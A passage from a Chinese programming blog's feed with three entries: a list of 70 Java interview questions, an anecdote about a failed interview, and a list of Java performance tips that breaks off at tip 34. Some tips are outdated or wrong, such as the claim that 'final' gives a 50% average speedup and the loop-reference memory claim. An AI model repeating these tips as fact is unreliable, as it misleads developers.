      <url>/2025/10/30/%E9%9D%A2%E8%AF%95/%E9%98%BF%E9%87%8C%E5%B7%B4%E5%B7%B4%E9%AB%98%E7%BA%A7%20Java%20%E9%9D%A2%E8%AF%95%E9%A2%98%2070%20%E9%81%93/</url>
      
        <content type="html"><![CDATA[<p>整理的70道阿里的Java面试题，都来挑战一下，看看自己有多厉害。下面题目都带超详细的解答，详情见底部。</p><p>1、java事件机制包括哪三个部分？分别介绍。</p><p>2、为什么要使用线程池？</p><p>3、线程池有什么作用？</p><p>4、说说几种常见的线程池及使用场景。</p><p>5、线程池都有哪几种工作队列？</p><p>6、怎么理解无界队列和有界队列？</p><p>7、线程池中的几种重要的参数及流程说明。</p><p>8、什么是反射机制？</p><p>9、说说反射机制的作用。</p><p>10、反射机制会不会有性能问题？</p><p>11、你怎么理解http协议？</p><p>12、说说http协议的工作流程。</p><p>13、http有哪些请求提交方式？</p><p>14、http中的200,302,403,404,500,503都代表什么状态？</p><p>15、http get和post有什么区别？</p><p>16、你怎么理解cookie和session，有哪些不同点？</p><p>17、什么是web缓存？有什么优点？</p><p>18、什么是https，说说https的工作原理？</p><p>19、什么是http代理服务器，有什么用？</p><p>20、什么是虚拟主机及实现原理？</p><p>21、什么是Java虚拟机，为什么要使用？</p><p>22、说说Java虚拟机的生命周期及体系结构。</p><p>23、说一说Java内存区域。</p><p>24、什么是分布式系统？</p><p>25、分布式系统你会考虑哪些方面？</p><p>26、讲一讲TCP协议的三次握手和四次挥手流程。</p><p>27、为什么TCP建立连接协议是三次握手，而关闭连接却是四次握手呢？为什么不能用两次握手进行连接？</p><p>28、为什么TCP TIME_WAIT状态还需要等2MSL后才能返回到CLOSED状态？</p><p>29、什么是DoS、DDoS、DRDoS攻击？如何防御？</p><p>30、描述一下Java异常层次结构。</p><p>31、什么是检查异常，不受检查异常，运行时异常？并分别举例说明。</p><p>32、finally块一定会执行吗？</p><p>33、正常情况下，当在try块或catch块中遇到return语句时，finally语句块在方法返回之前还是之后被执行？</p><p>34、try、catch、finally语句块的执行顺序。</p><p>35、Java虚拟机中，数据类型可以分为哪几类？</p><p>36、怎么理解栈、堆？堆中存什么？栈中存什么？</p><p>37、为什么要把堆和栈区分出来呢？栈中不是也可以存储数据吗？</p><p>38、在Java中，什么是是栈的起始点，同是也是程序的起始点？</p><p>39、为什么不把基本类型放堆中呢？</p><p>40、Java中的参数传递时传值呢？还是传引用？</p><p>41、Java中有没有指针的概念？</p><p>42、Java中，栈的大小通过什么参数来设置？</p><p>43、一个空Object对象的占多大空间？</p><p>44、对象引用类型分为哪几类？</p><p>45、讲一讲垃圾回收算法。</p><p>46、如何解决内存碎片的问题？</p><p>47、如何解决同时存在的对象创建和对象回收问题？</p><p>48、讲一讲内存分代及生命周期。</p><p>49、什么情况下触发垃圾回收？</p><p>50、如何选择合适的垃圾收集算法？</p><p>51、JVM中最大堆大小有没有限制？</p><p>52、堆大小通过什么参数设置？</p><p>53、JVM有哪三种垃圾回收器？</p><p>54、吞吐量优先选择什么垃圾回收器？响应时间优先呢？</p><p>55、如何进行JVM调优？有哪些方法？</p><p>56、如何理解内存泄漏问题？有哪些情况会导致内存泄露？如何解决？</p><p>57、从分布式系统部署角度考虑，分哪几层？</p><p>58、如何解决业务层的数据访问问题？</p><p>59、为了解决数据库服务器的负担，如何做数据库的分布？</p><p>60、什么是著名的拜占庭将军问题？</p><p>61、为什么说TCP&#x2F;IP协议是不可靠的？</p><p>62、讲讲CAP理念。</p><p>63、怎么理解强一致性、单调一致性和最终一致性？</p><p>64、分布式系统设计你会考虑哪些策略？</p><p>65、最常见的数据分布方式是什么？</p><p>66、谈一谈一致性哈希算法。</p><p>67、paxos是什么？</p><p>68、什么是Lease机制？</p><p>69、如何理解选主算法？</p><p>70、OSI有哪七层模型？TCP&#x2F;IP是哪四层模型。</p>]]></content>
      
      
      <categories>
          
          <category> 程序人生 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 面试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>面试一个 3 年 Java 程序员，一个问题都不会！</title>
      <link href="/2025/10/30/%E9%9D%A2%E8%AF%95/%E9%9D%A2%E8%AF%95%E4%B8%80%E4%B8%AA%203%20%E5%B9%B4%20Java%20%E7%A8%8B%E5%BA%8F%E5%91%98%EF%BC%8C%E4%B8%80%E4%B8%AA%E9%97%AE%E9%A2%98%E9%83%BD%E4%B8%8D%E4%BC%9A%EF%BC%81/"/>
      <url>/2025/10/30/%E9%9D%A2%E8%AF%95/%E9%9D%A2%E8%AF%95%E4%B8%80%E4%B8%AA%203%20%E5%B9%B4%20Java%20%E7%A8%8B%E5%BA%8F%E5%91%98%EF%BC%8C%E4%B8%80%E4%B8%AA%E9%97%AE%E9%A2%98%E9%83%BD%E4%B8%8D%E4%BC%9A%EF%BC%81/</url>
      
        <content type="html"><![CDATA[<p>大家周末愉快，当你看到这篇文章的时候，事情已经过去几天了。</p><p>刚从洽谈室走出来，心情很复杂！</p><p>栈长面试过很多人，不乏知识渊博、技能顶尖的选手，但从未遇到过工作了三年，却一个问题都答不上来。。</p><p>这场史无前例的面试，我和面试者的脸上都写满了尴尬，最后戏剧性收场。</p><p>面试者工作了三年，简历上写满了各种前沿的技术，如：Spring Boot、Spring Cloud、Dubbo、RabbitMQ……</p><p>自我介绍没什么亮点，能想起来的就是他说的前后端分离了，下面便进入了尴尬模式。。</p><p>栈长：你刚说到你们做了前后端分离，你能说下前后端分离有哪些规范吗？</p><p>他：规范？没有什么规范啊。</p><p>栈长：怎么可能没规范呢？</p><p>他：（他想半天）……就是后端返回 JSON 数据，前端人员根据一个文档来开发。</p><p>栈长：就这么简单么，还有别的么？</p><p>他：没有别的吧！</p><p>栈长：那后端接口设计没任何规范吗？别人拿到 URL 不是可以随意调用么？</p><p>他：有 MD5 加密什么的吧……</p><p>我接着问怎么处理加密逻辑的，又说不出所以然了，显然我对前后端分离相关回答是非常不满意的，我接着对这个话题继续展开了连环炮，考验下他的技术攻底到底怎么样。</p><p>栈长：那后端向前端怎么返回 JSON 格式的数据呢？</p><p>他：（吱唔……抓头发，眼神漂浮不定……）</p><p>栈长：这个问题的难点在哪？</p><p>他：没有难点，只是我不知道。</p><p>栈长：（这都不知道，考下他 Spring 常识吧！）那 Spring 里面怎么注入一个对象？</p><p>他：（吱唔……抓头发，眼神漂浮不定……）</p><p>栈长：（Spring都不知道，考下他 Java 常识吧！）那 Java 里面怎么实现多线程？</p><p>他：（吱唔……抓头发，眼神漂浮不定……）</p><p>栈长：那 JVM 里面分为哪些内存区域？（感觉问不下去了，最后一个问题了）</p><p>他：（吱唔……抓头发，眼神漂浮不定……）</p><p>栈长：（真心问不下去了……）你是做 Java 的么？我都没往深里啊，这么简单的都不会</p><p>他：最近面试都没人这么问我……我怀疑我是个假的吧！（然后垂下头）</p><p>栈长：建议你回去好好复试一下吧，这样面试不通过的，不好意思。</p><p>……</p><p>…………不能完全还原面试现场，以上只是部分内容回顾。</p><p>整场下来，给我的感觉就是，他一个问题都没有答上来。。</p><p>面试完，尴尬收场，不知道说什么好。但从整个面试环节以及他的脸上，我读到了他的尴尬、汗颜、无地自容……</p><p>事后我也回顾了这场面试，面试者很有伪造简历及工作经验的嫌疑，也或许是他在单位写 CRUD 写多了，很多基础的知识都忘记了。</p><p>不管怎么说，回过头来想，即使每天 CRUD，也不可能一个问题都答不上来啊，关键问的都是常用的基础知识，还工作了三年，不知道大家怎么看，反正我觉得挺不可思议的。</p><p>现在的程序员啊，要么牛的一比，牛马蛇神啥的都能说一套，要么菜的一比，一个问题都不会，人与人之间的差距真的太大了。</p><p>工作三年了，还不如一个刚毕业的，程序员们，真的要对自己有要求了，技术上每年都要有所提升，不然和咸鱼有什么区别？又凭什么要比实习生更高的薪水？用什么来支撑？</p><p>为什么说面试造火箭，工作拧螺丝，这不是笑话，如果你只会拧螺丝，那你永远只会在最底层，即使来了造火箭的活，你也上不了。都要造火箭的薪水，为什么企业要招个只会拧螺丝的？</p><p>另外，现在 Java 开发市场简直不能太饱和了，人才太多，鬼才也多，培训机构两三个月就能培训出来一大批，编程门槛何止之低，竞争又何止之大，不会点硬核，怎么脱颖而出？</p><p>不要拿在公司只做 CRUD 这些借口吧，这不是阻止技术能力提升的理由，既然选择了这一行，就得努力吧，闲下来多看些技术书籍，关注下技术发展动态，关键是要沉下心去学习。</p><hr>]]></content>
      
      
      <categories>
          
          <category> 程序人生 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 面试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>44 个 Java 代码性能优化总结</title>
      <link href="/2025/10/30/%E6%80%A7%E8%83%BD%E4%BC%98%E5%8C%96/44%20%E4%B8%AA%20Java%20%E4%BB%A3%E7%A0%81%E6%80%A7%E8%83%BD%E4%BC%98%E5%8C%96%E6%80%BB%E7%BB%93/"/>
      <url>/2025/10/30/%E6%80%A7%E8%83%BD%E4%BC%98%E5%8C%96/44%20%E4%B8%AA%20Java%20%E4%BB%A3%E7%A0%81%E6%80%A7%E8%83%BD%E4%BC%98%E5%8C%96%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<p>代码优化的最重要的作用应该是：避免未知的错误。在代码上线运行的过程中，往往会出现很多我们意想不到的错误，因为线上环境和开发环境是非常不同的，错误定位到最后往往是一个非常小的原因。然而为了解决这个错误，我们需要先自验证、再打包出待替换的class文件、暂停业务并重启，对于一个成熟的项目而言，最后一条其实影响是非常大的，这意味着这段时间用户无法访问应用。因此，在写代码的时候，从源头开始注意各种细节，权衡并使用最优的选择，将会很大程度上避免出现未知的错误，从长远看也极大的降低了工作量。</p><p><strong>代码优化的目标是：</strong></p><p>1、减小代码的体积</p><p>2、提高代码运行的效率</p><p><strong>代码优化细节</strong></p><p><strong>（1）尽量指定类、方法的final修饰符</strong></p><p>带有final修饰符的类是不可派生的。在Java核心API中，有许多应用final的例子，例如java.lang.String，整个类都是final的。为类指定final修饰符可以让类不可以被继承，为方法指定final修饰符可以让方法不可以被重写。如果指定了一个类为final，则该类所有的方法都是final的。Java编译器会寻找机会内联所有的final方法，内联对于提升Java运行效率作用重大，具体参见Java运行期优化。此举能够使性能平均提高50%。</p><p><strong>（2）尽量重用对象</strong></p><p>特别是String对象的使用，出现字符串连接时应该使用StringBuilder&#x2F;StringBuffer代替。由于Java虚拟机不仅要花时间生成对象，以后可能还需要花时间对这些对象进行垃圾回收和处理，因此，生成过多的对象将会给程序的性能带来很大的影响。</p><p><strong>（3）尽可能使用局部变量</strong></p><p>调用方法时传递的参数以及在调用中创建的临时变量都保存在栈中，速度较快，其他变量，如静态变量、实例变量等，都在堆中创建，速度较慢。另外，栈中创建的变量，随着方法的运行结束，这些内容就没了，不需要额外的垃圾回收。</p><p><strong>（4）及时关闭流</strong></p><p>Java编程过程中，进行数据库连接、I&#x2F;O流操作时务必小心，在使用完毕后，及时关闭以释放资源。因为对这些大对象的操作会造成系统大的开销，稍有不慎，将会导致严重的后果。</p><p><strong>（5）尽量减少对变量的重复计算</strong></p><p>明确一个概念，对方法的调用，即使方法中只有一句语句，也是有消耗的，包括创建栈帧、调用方法时保护现场、调用方法完毕时恢复现场等。所以例如下面的操作：</p><pre class="line-numbers language-none"><code class="language-none">for (int i &#x3D; 0; i &lt; list.size(); i++)&#123;...&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>建议替换为：</p><pre class="line-numbers language-none"><code class="language-none">for (int i &#x3D; 0, length &#x3D; list.size(); i &lt; length; i++)&#123;...&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>这样，在list.size()很大的时候，就减少了很多的消耗</p><p><strong>（6）尽量采用懒加载的策略，即在需要的时候才创建</strong></p><p>例如：</p><pre class="line-numbers language-none"><code class="language-none">String str &#x3D; &quot;aaa&quot;;if (i &#x3D;&#x3D; 1)&#123;　　list.add(str);&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>建议替换为：</p><pre class="line-numbers language-none"><code class="language-none">if (i &#x3D;&#x3D; 1)&#123;　　String str &#x3D; &quot;aaa&quot;;　　list.add(str);&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>（7）慎用异常</strong></p><p>异常对性能不利。抛出异常首先要创建一个新的对象，Throwable接口的构造函数调用名为fillInStackTrace()的本地同步方法，fillInStackTrace()方法检查堆栈，收集调用跟踪信息。只要有异常被抛出，Java虚拟机就必须调整调用堆栈，因为在处理过程中创建了一个新的对象。异常只能用于错误处理，不应该用来控制程序流程。</p><p><strong>（8）不要在循环中使用try…catch…，应该把其放在最外层</strong></p><p>根据网友们提出的意见，这一点我认为值得商榷</p><p><strong>（9）如果能估计到待添加的内容长度，为底层以数组方式实现的集合、工具类指定初始长度</strong></p><p>比如ArrayList、LinkedLlist、StringBuilder、StringBuffer、HashMap、HashSet等等，以StringBuilder为例：</p><ul><li>StringBuilder()　　　　　　&#x2F;&#x2F; 默认分配16个字符的空间</li><li>StringBuilder(int size)　　&#x2F;&#x2F; 默认分配size个字符的空间</li><li>StringBuilder(String str)　&#x2F;&#x2F; 默认分配16个字符+str.length()个字符空间</li></ul><p>可以通过类（这里指的不仅仅是上面的StringBuilder）的构造函数来设定它的初始化容量，这样可以明显地提升性能。比如StringBuilder吧，length表示当前的StringBuilder能保持的字符数量。因为当StringBuilder达到最大容量的时候，它会将自身容量增加到当前的2倍再加2，无论何时只要StringBuilder达到它的最大容量，它就不得不创建一个新的字符数组然后将旧的字符数组内容拷贝到新字符数组中—-这是十分耗费性能的一个操作。试想，如果能预估到字符数组中大概要存放5000个字符而不指定长度，最接近5000的2次幂是4096，每次扩容加的2不管，那么：</p><ul><li>在4096 的基础上，再申请8194个大小的字符数组，加起来相当于一次申请了12290个大小的字符数组，如果一开始能指定5000个大小的字符数组，就节省了一倍以上的空间</li><li>把原来的4096个字符拷贝到新的的字符数组中去<br>这样，既浪费内存空间又降低代码运行效率。所以，给底层以数组实现的集合、工具类设置一个合理的初始化容量是错不了的，这会带来立竿见影的效果。但是，注意，像HashMap这种是以数组+链表实现的集合，别把初始大小和你估计的大小设置得一样，因为一个table上只连接一个对象的可能性几乎为0。初始大小建议设置为2的N次幂，如果能估计到有2000个元素，设置成new HashMap(128)、new HashMap(256)都可以。</li></ul><p><strong>（10）当复制大量数据时，使用System.arraycopy()命令</strong></p><p><strong>（11）乘法和除法使用移位操作</strong></p><p>例如：</p><pre class="line-numbers language-none"><code class="language-none">for (val &#x3D; 0; val &lt; 100000; val +&#x3D; 5)&#123;　　a &#x3D; val * 8;　　b &#x3D; val &#x2F; 2;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>用移位操作可以极大地提高性能，因为在计算机底层，对位的操作是最方便、最快的，因此建议修改为： </p><pre class="line-numbers language-none"><code class="language-none">for (val &#x3D; 0; val &lt; 100000; val +&#x3D; 5)&#123;　　a &#x3D; val &lt;&lt; 3;　　b &#x3D; val &gt;&gt; 1;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>移位操作虽然快，但是可能会使代码不太好理解，因此最好加上相应的注释。</p><p><strong>（12）循环内不要不断创建对象引用</strong></p><p>例如：</p><pre class="line-numbers language-none"><code class="language-none">for (int i &#x3D; 1; i &lt;&#x3D; count; i++)&#123;    Object obj &#x3D; new Object();    &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>这种做法会导致内存中有count份Object对象引用存在，count很大的话，就耗费内存了，建议为改为：</p><pre class="line-numbers language-none"><code class="language-none">Object obj &#x3D; null;for (int i &#x3D; 0; i &lt;&#x3D; count; i++)&#123;    obj &#x3D; new Object();&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这样的话，内存中只有一份Object对象引用，每次new Object()的时候，Object对象引用指向不同的Object罢了，但是内存中只有一份，这样就大大节省了内存空间了。</p><p><strong>（13）基于效率和类型检查的考虑，应该尽可能使用array，无法确定数组大小时才使用ArrayList</strong></p><p><strong>（14）尽量使用HashMap、ArrayList、StringBuilder，除非线程安全需要，否则不推荐使用Hashtable、Vector、StringBuffer，后三者由于使用同步机制而导致了性能开销</strong></p><p><strong>（15）不要将数组声明为public static final</strong></p><p>因为这毫无意义，这样只是定义了引用为static final，数组的内容还是可以随意改变的，将数组声明为public更是一个安全漏洞，这意味着这个数组可以被外部类所改变</p><p><strong>（16）尽量在合适的场合使用单例</strong></p><p>使用单例可以减轻加载的负担、缩短加载的时间、提高加载的效率，但并不是所有地方都适用于单例，简单来说，单例主要适用于以下三个方面：</p><ul><li>控制资源的使用，通过线程同步来控制资源的并发访问</li><li>控制实例的产生，以达到节约资源的目的</li><li>控制数据的共享，在不建立直接关联的条件下，让多个不相关的进程或线程之间实现通信</li></ul><p><strong>（17）尽量避免随意使用静态变量</strong></p><p>要知道，当某个对象被定义为static的变量所引用，那么gc通常是不会回收这个对象所占有的堆内存的，如：</p><pre class="line-numbers language-none"><code class="language-none">public class A&#123;    private static B b &#x3D; new B();  &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>此时静态变量b的生命周期与A类相同，如果A类不被卸载，那么引用B指向的B对象会常驻内存，直到程序终止</p><p> <strong>（18）及时清除不再需要的会话</strong></p><p>为了清除不再活动的会话，许多应用服务器都有默认的会话超时时间，一般为30分钟。当应用服务器需要保存更多的会话时，如果内存不足，那么操作系统会把部分数据转移到磁盘，应用服务器也可能根据MRU（最近最频繁使用）算法把部分不活跃的会话转储到磁盘，甚至可能抛出内存不足的异常。如果会话要被转储到磁盘，那么必须要先被序列化，在大规模集群中，对对象进行序列化的代价是很昂贵的。因此，当会话不再需要时，应当及时调用HttpSession的invalidate()方法清除会话。</p><p><strong>（19）实现RandomAccess接口的集合比如ArrayList，应当使用最普通的for循环而不是foreach循环来遍历</strong></p><p>这是JDK推荐给用户的。JDK API对于RandomAccess接口的解释是：实现RandomAccess接口用来表明其支持快速随机访问，此接口的主要目的是允许一般的算法更改其行为，从而将其应用到随机或连续访问列表时能提供良好的性能。实际经验表明，实现RandomAccess接口的类实例，假如是随机访问的，使用普通for循环效率将高于使用foreach循环；反过来，如果是顺序访问的，则使用Iterator会效率更高。可以使用类似如下的代码作判断：</p><pre class="line-numbers language-none"><code class="language-none">if (list instanceof RandomAccess)&#123;    for (int i &#x3D; 0; i &lt; list.size(); i++)&#123;&#125;&#125;else&#123;    Iterator&lt;?&gt; iterator &#x3D; list.iterable();    while (iterator.hasNext())&#123;iterator.next()&#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>foreach循环的底层实现原理就是迭代器Iterator，参见Java语法糖1：可变长度参数以及foreach循环原理。所以后半句”反过来，如果是顺序访问的，则使用Iterator会效率更高”的意思就是顺序访问的那些类实例，使用foreach循环去遍历。</p><p><strong>（20）使用同步代码块替代同步方法</strong></p><p>这点在多线程模块中的synchronized锁方法块一文中已经讲得很清楚了，除非能确定一整个方法都是需要进行同步的，否则尽量使用同步代码块，避免对那些不需要进行同步的代码也进行了同步，影响了代码执行效率。</p><p><strong>（21）将常量声明为static final，并以大写命名</strong></p><p>这样在编译期间就可以把这些内容放入常量池中，避免运行期间计算生成常量的值。另外，将常量的名字以大写命名也可以方便区分出常量与变量</p><p><strong>（22）不要创建一些不使用的对象，不要导入一些不使用的类</strong></p><p>这毫无意义，如果代码中出现”The value of the local variable i is not used”、”The import java.util is never used”，那么请删除这些无用的内容</p><p><strong>（23）程序运行过程中避免使用反射</strong></p><p>关于，请参见反射。反射是Java提供给用户一个很强大的功能，功能强大往往意味着效率不高。不建议在程序运行过程中使用尤其是频繁使用反射机制，特别是Method的invoke方法，如果确实有必要，一种建议性的做法是将那些需要通过反射加载的类在项目启动的时候通过反射实例化出一个对象并放入内存—-用户只关心和对端交互的时候获取最快的响应速度，并不关心对端的项目启动花多久时间。</p><p><strong>（24）使用数据库连接池和线程池</strong></p><p>这两个池都是用于重用对象的，前者可以避免频繁地打开和关闭连接，后者可以避免频繁地创建和销毁线程</p><p><strong>（25）使用带缓冲的输入输出流进行IO操作</strong></p><p>带缓冲的输入输出流，即BufferedReader、BufferedWriter、BufferedInputStream、BufferedOutputStream，这可以极大地提升IO效率</p><p><strong>（26）顺序插入和随机访问比较多的场景使用ArrayList，元素删除和中间插入比较多的场景使用LinkedList</strong></p><p>这个，理解ArrayList和LinkedList的原理就知道了</p><p><strong>（27）不要让public方法中有太多的形参</strong></p><p>public方法即对外提供的方法，如果给这些方法太多形参的话主要有两点坏处：</p><ul><li>违反了面向对象的编程思想，Java讲求一切都是对象，太多的形参，和面向对象的编程思想并不契合</li><li>参数太多势必导致方法调用的出错概率增加</li></ul><p>至于这个”太多”指的是多少个，3、4个吧。比如我们用JDBC写一个insertStudentInfo方法，有10个学生信息字段要插如Student表中，可以把这10个参数封装在一个实体类中，作为insert方法的形参</p><p><strong>（28）字符串变量和字符串常量equals的时候将字符串常量写在前面</strong></p><p>这是一个比较常见的小技巧了，如果有以下代码：</p><pre class="line-numbers language-none"><code class="language-none">String str &#x3D; &quot;123&quot;;if (str.equals(&quot;123&quot;))&#123;    ...&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>建议修改为：</p><pre class="line-numbers language-none"><code class="language-none">String str &#x3D; &quot;123&quot;;if (&quot;123&quot;.equals(str))&#123;    ...&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这么做主要是可以避免空指针异常</p><p><strong>（29）请知道，在java中if (i &#x3D;&#x3D; 1)和if (1 &#x3D;&#x3D; i)是没有区别的，但从阅读习惯上讲，建议使用前者</strong></p><p>平时有人问，”if (i&#x3D;&#x3D;1)”和”if(1&#x3D;&#x3D;i)”有没有区别，这就要从C&#x2F;C++讲起。</p><p>在C&#x2F;C++中，”if (i&#x3D;&#x3D;1)”判断条件成立，是以0与非0为基准的，0表示false，非0表示true，如果有这么一段代码：</p><pre class="line-numbers language-none"><code class="language-none">int i &#x3D; 2;if (i &#x3D;&#x3D; 1)&#123;    ...&#125;else&#123;    ...&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>C&#x2F;C++判断”i&#x3D;&#x3D;1”不成立，所以以0表示，即false。但是如果：</p><pre class="line-numbers language-none"><code class="language-none">int i &#x3D; 2;if (i &#x3D; 1)&#123;    ...&#125;else&#123;    ...&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>万一程序员一个不小心，把”if(i&#x3D;&#x3D;1)”写成”if(i&#x3D;1)”，这样就有问题了。在if之内将i赋值为1，if判断里面的内容非0，返回的就是true了，但是明明i为2，比较的值是1，应该返回的false。这种情况在C&#x2F;C++的开发中是很可能发生的并且会导致一些难以理解的错误产生，所以，为了避免开发者在if语句中不正确的赋值操作，建议将if语句写为：</p><pre class="line-numbers language-none"><code class="language-none">int i &#x3D; 2;if (1 &#x3D;&#x3D; i)&#123;    ...&#125;else&#123;    ...&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这样，即使开发者不小心写成了”1&#x3D;i”，C&#x2F;C++编译器也可以第一时间检查出来，因为我们可以对一个变量赋值i为1，但是不能对一个常量赋值1为i。</p><p>但是，在Java中，C&#x2F;C++这种”if(i&#x3D;1)”的语法是不可能出现的，因为一旦写了这种语法，Java就会编译报错”Type mismatch: cannot convert from int to boolean”。但是，尽管Java的”if (i &#x3D;&#x3D; 1)”和”if (1 &#x3D;&#x3D; i)”在语义上没有任何区别，从阅读习惯上讲，建议使用前者会更好些。</p><p><strong>（30）不要对数组使用toString()方法</strong></p><p>看一下对数组使用toString()打印出来的是什么：</p><pre class="line-numbers language-none"><code class="language-none">public static void main(String[] args)&#123;    int[] is &#x3D; new int[]&#123;1, 2, 3&#125;;    System.out.println(is.toString());&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>结果是：</p><pre class="line-numbers language-none"><code class="language-none">[I@18a992f<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>本意是想打印出数组内容，却有可能因为数组引用is为空而导致空指针异常。不过虽然对数组toString()没有意义，但是对集合toString()是可以打印出集合里面的内容的，因为集合的父类AbstractCollections<E>重写了Object的toString()方法。</p><p><strong>（31）不要对超出范围的基本数据类型做向下强制转型</strong></p><p>这绝不会得到想要的结果：</p><pre class="line-numbers language-none"><code class="language-none">public static void main(String[] args)&#123;    long l &#x3D; 12345678901234L;    int i &#x3D; (int)l;    System.out.println(i);&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>我们可能期望得到其中的某几位，但是结果却是：</p><pre class="line-numbers language-none"><code class="language-none">1942892530<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>解释一下。Java中long是8个字节64位的，所以12345678901234在计算机中的表示应该是：</p><pre class="line-numbers language-none"><code class="language-none">0000 0000 0000 0000 0000 1011 0011 1010 0111 0011 1100 1110 0010 1111 1111 0010<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>一个int型数据是4个字节32位的，从低位取出上面这串二进制数据的前32位是：</p><pre class="line-numbers language-none"><code class="language-none">0111 0011 1100 1110 0010 1111 1111 0010<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这串二进制表示为十进制1942892530，所以就是我们上面的控制台上输出的内容。从这个例子上还能顺便得到两个结论：</p><p>1、整型默认的数据类型是int，long l &#x3D; 12345678901234L，这个数字已经超出了int的范围了，所以最后有一个L，表示这是一个long型数。顺便，浮点型的默认类型是double，所以定义float的时候要写成””float f &#x3D; 3.5f”</p><p>2、接下来再写一句”int ii &#x3D; l + i;”会报错，因为long + int是一个long，不能赋值给int</p><p> <strong>（32）公用的集合类中不使用的数据一定要及时remove掉</strong></p><p>如果一个集合类是公用的（也就是说不是方法里面的属性），那么这个集合里面的元素是不会自动释放的，因为始终有引用指向它们。所以，如果公用集合里面的某些数据不使用而不去remove掉它们，那么将会造成这个公用集合不断增大，使得系统有内存泄露的隐患。</p><p><strong>（33）把一个基本数据类型转为字符串，基本数据类型.toString()是最快的方式、String.valueOf(数据)次之、数据+””最慢</strong></p><p>把一个基本数据类型转为一般有三种方式，我有一个Integer型数据i，可以使用i.toString()、String.valueOf(i)、i+””三种方式，三种方式的效率如何，看一个测试：</p><pre class="line-numbers language-none"><code class="language-none">public static void main(String[] args)&#123;    int loopTime &#x3D; 50000;    Integer i &#x3D; 0;    long startTime &#x3D; System.currentTimeMillis();    for (int j &#x3D; 0; j &lt; loopTime; j++)    &#123;        String str &#x3D; String.valueOf(i);    &#125;        System.out.println(&quot;String.valueOf()：&quot; + (System.currentTimeMillis() - startTime) + &quot;ms&quot;);    startTime &#x3D; System.currentTimeMillis();    for (int j &#x3D; 0; j &lt; loopTime; j++)    &#123;        String str &#x3D; i.toString();    &#125;        System.out.println(&quot;Integer.toString()：&quot; + (System.currentTimeMillis() - startTime) + &quot;ms&quot;);    startTime &#x3D; System.currentTimeMillis();    for (int j &#x3D; 0; j &lt; loopTime; j++)    &#123;        String str &#x3D; i + &quot;&quot;;    &#125;        System.out.println(&quot;i + \&quot;\&quot;：&quot; + (System.currentTimeMillis() - startTime) + &quot;ms&quot;);&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>运行结果为：</p><pre class="line-numbers language-none"><code class="language-none">String.valueOf()：11msInteger.toString()：5msi + &quot;&quot;：25ms<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>所以以后遇到把一个基本数据类型转为String的时候，优先考虑使用toString()方法。至于为什么，很简单：</p><ul><li>String.valueOf()方法底层调用了Integer.toString()方法，但是会在调用前做空判断</li><li>Integer.toString()方法就不说了，直接调用了</li><li>i + “”底层使用了StringBuilder实现，先用append方法拼接，再用toString()方法获取字符串</li></ul><p>三者对比下来，明显是2最快、1次之、3最慢</p><p><strong>（34）使用最有效率的方式去遍历Map</strong></p><p>遍历Map的方式有很多，通常场景下我们需要的是遍历Map中的Key和Value，那么推荐使用的、效率最高的方式是：</p><pre class="line-numbers language-none"><code class="language-none">public static void main(String[] args)&#123;    HashMap&lt;String, String&gt; hm &#x3D; new HashMap&lt;String, String&gt;();    hm.put(&quot;111&quot;, &quot;222&quot;);            Set&lt;Map.Entry&lt;String, String&gt;&gt; entrySet &#x3D; hm.entrySet();    Iterator&lt;Map.Entry&lt;String, String&gt;&gt; iter &#x3D; entrySet.iterator();    while (iter.hasNext())    &#123;        Map.Entry&lt;String, String&gt; entry &#x3D; iter.next();        System.out.println(entry.getKey() + &quot;\t&quot; + entry.getValue());    &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>如果你只是想遍历一下这个Map的key值，那用”Set<String> keySet &#x3D; 